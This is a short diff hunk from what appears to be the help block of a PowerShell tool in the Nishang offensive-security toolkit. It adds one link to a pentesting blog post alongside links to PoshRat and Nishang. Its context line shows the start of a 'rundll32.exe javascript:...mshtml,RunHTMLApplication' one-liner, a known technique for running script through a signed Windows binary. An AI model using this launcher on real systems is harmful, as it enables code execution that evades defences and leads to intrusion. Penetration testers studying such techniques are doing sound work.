@@ -33,7 +33,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 
 .LINK
-
+http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
 https://github.com/subTee/PoshRat
 https://github.com/samratashok/nishang
 #>     
